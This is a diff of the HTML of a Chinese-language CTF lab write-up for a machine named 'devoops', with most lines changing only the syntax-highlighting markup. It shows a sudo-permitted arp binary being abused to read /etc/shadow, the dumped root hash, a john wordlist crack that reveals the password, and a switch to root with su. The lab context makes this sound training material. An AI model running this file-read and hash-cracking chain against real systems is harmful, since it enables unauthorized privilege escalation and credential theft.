+devoops:<span class="pl-k">~</span>$ ls
 user.flag
-devoops:~$ cat user.flag
-
-</code></pre>
+devoops:<span class="pl-k">~</span>$ cat user.flag
+</pre></div>
 <h3>获得root</h3>
 <p><code class="notranslate">sudo</code>发现 hana 用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/sbin/arp</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">devoops:~$ sudo -l
-Matching Defaults entries for hana on devoops:
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> hana on devoops:
+    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
-Runas and Command-specific defaults for hana:
-    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+Runas and Command-specific defaults <span class="pl-k">for</span> hana:
+    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
 
 User hana may run the following commands on devoops:
-    (root) NOPASSWD: /sbin/arp
-</code></pre>
+    (root) NOPASSWD: /sbin/arp</pre></div>
 <p>[<a href="https://gtfobins.github.io/" rel="nofollow">查阅</a>](<a href="https://gtfobins.github.io/)%60" rel="nofollow">https://gtfobins.github.io/)`</a> GTFObins<code class="notranslate">，发现 </code>arp` 可以用于任意文件读取</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">devoops:~$ sudo arp -v -f "/root/root.flag"
-arp: cannot open etherfile /root/root.flag !
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ sudo arp -v -f <span class="pl-s"><span class="pl-pds">"</span>/root/root.flag<span class="pl-pds">"</span></span>
+arp: cannot open etherfile /root/root.flag <span class="pl-k">!</span></pre></div>
 <p>发现没有<code class="notranslate">root.txt</code>和<code class="notranslate"> root.flag</code><br>
 尝试读取<code class="notranslate"> /etc/shadow</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">devoops:~$ sudo arp -v -f "/etc/shadow"
-&gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ sudo arp -v -f <span class="pl-s"><span class="pl-pds">"</span>/etc/shadow<span class="pl-pds">"</span></span>
+<span class="pl-k">&gt;&gt;</span> root:<span class="pl-smi">$6</span><span class="pl-smi">$FGoCakO3</span>/TPFyfOf<span class="pl-smi">$6</span>eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
 .....
-runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
-arp: format error on line 20 of etherfile /etc/shadow !
-&gt;&gt; hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::
+runner:<span class="pl-smi">$6</span><span class="pl-smi">$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS</span>/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
+arp: format error on line 20 of etherfile /etc/shadow <span class="pl-k">!</span>
+<span class="pl-k">&gt;&gt;</span> hana:<span class="pl-smi">$6</span><span class="pl-smi">$snNJGjzsPo</span>.be3r1<span class="pl-smi">$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck</span>.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::
 
-devoops:~$
-</code></pre>
+devoops:<span class="pl-k">~</span>$</pre></div>
 <p>发现了<code class="notranslate"> root</code> 用户的 <code class="notranslate">shadow</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root:<span class="pl-smi">$6</span><span class="pl-smi">$FGoCakO3</span>/TPFyfOf<span class="pl-smi">$6</span>eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::</pre></div>
 <p>使用 <code class="notranslate">john</code>爆破<code class="notranslate">hash</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::'&gt;shad.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::'&gt;shad.txt</span>
 
 ┌──(root㉿LAPTOP-FAMILY)-[/tmp]
-└─# john shad.txt --wordlist=/usr/share/wordlists/rockyou.txt
-#rockyou.txt太久了换个作者喜欢的字典就很快
-└─# john shad.txt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+└─<span class="pl-c"><span class="pl-c">#</span> john shad.txt --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="pl-c"><span class="pl-c">#</span>rockyou.txt太久了换个作者喜欢的字典就很快</span>
+└─<span class="pl-c"><span class="pl-c">#</span> john shad.txt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt</span>
 Using default input encoding: UTF-8
-Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
-Cost 1 (iteration count) is 5000 for all loaded hashes
+Loaded 1 password <span class="pl-c1">hash</span> (sha512crypt, crypt(3) <span class="pl-smi">$6</span>$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 <span class="pl-k">for</span> all loaded hashes
 Will run 24 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
 eris             (root)
 1g 0:00:00:02 DONE (2025-05-30 00:41) 0.4032g/s 44593p/s 44593c/s 44593C/s likewise..28102005
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
-</code></pre>
+Use the <span class="pl-s"><span class="pl-pds">"</span>--show<span class="pl-pds">"</span></span> option to display all of the cracked passwords reliably
+Session completed.</pre></div>
 <p>找到 <code class="notranslate">root</code> 密码为<code class="notranslate"> eris</code></p>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">devoops:~$ su -
-Password:#eris
-devoops:~# id
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ su -
+Password:<span class="pl-c"><span class="pl-c">#</span>eris</span>
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-devoops:~#
-devoops:~# cd
-devoops:~# ls
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span></span>
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cd</span>
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls</span>
 N073.7X7              R007.7x7oOoOoOoOoOoO
-devoops:~# cat R007.7x7oOoOoOoOoOoO
-
-</code></pre></div>
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat R007.7x7oOoOoOoOoOoO</span>
+</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
